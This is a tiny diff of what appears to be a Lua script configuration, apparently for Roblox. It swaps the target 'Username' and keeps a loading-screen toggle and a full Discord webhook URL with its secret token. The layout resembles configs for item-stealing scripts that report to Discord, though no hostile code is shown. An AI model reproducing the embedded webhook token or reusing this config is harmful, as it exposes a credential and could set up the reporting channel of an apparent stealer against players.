@@ -1,4 +1,4 @@
-Username = "loadstping"
+Username = "Timoffey11"
 LoadScreen = false -- If you want to enable loadgui, rename to true
 Webhook = "https://discord.com/api/webhooks/1118931668527485069/OVWA43q9VXP7udXb0ae8OJFRs8yL60dOMHawkgc5IpqvTdhRcB7gFpwgfo25R-7wZg3U"
 
